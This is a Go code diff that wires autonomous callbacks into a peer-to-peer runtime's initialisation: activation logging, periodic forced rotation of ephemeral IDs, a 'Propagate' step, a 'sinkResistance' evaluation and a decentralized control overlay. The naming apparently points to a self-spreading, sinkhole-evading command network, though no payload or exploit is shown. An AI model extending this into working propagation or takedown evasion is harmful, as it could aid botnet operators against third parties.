@@ -284,6 +284,39 @@ func (rt *Runtime) init(ctx context.Context, config *Config, version string) err
 	rt.controllers = controllers
 	rt.advanced = advancedRuntime
 
+	activateCount := 0
+	advancedRuntime.SetActions(AutonomousActions{
+		OnActivate: func(ctx context.Context, state ActivationState) error {
+			activateCount++
+			rt.logger.Info("Autonomous activation", "peers", state.PeerCount, "network_idle", state.NetworkIdle)
+			if rt.recoveryController != nil {
+				rt.recoveryController.RecordActivity()
+			}
+			if rt.ephemeralIDs != nil && activateCount%5 == 0 {
+				rt.ephemeralIDs.ForceRotate()
+			}
+			return nil
+		},
+		OnPropagate: func(ctx context.Context) error {
+			if rt.propagationManager == nil {
+				return nil
+			}
+			return rt.propagationManager.Propagate(ctx)
+		},
+		OnAdapt: func(ctx context.Context, snapshot map[string]interface{}) error {
+			if rt.sinkResistance != nil && len(snapshot) > 0 {
+				rt.sinkResistance.Evaluate(ctx)
+			}
+			return nil
+		},
+		OnCredentialRotate: func(ctx context.Context) error {
+			if rt.ephemeralIDs != nil {
+				rt.ephemeralIDs.ForceRotate()
+			}
+			return nil
+		},
+	})
+
 	// Initialize control plane (decentralized control overlay)
 	cpTransport := controlplane.NewControllerTransport(logger, p2p, func() string {
 		if rt.ephemeralIDs == nil {
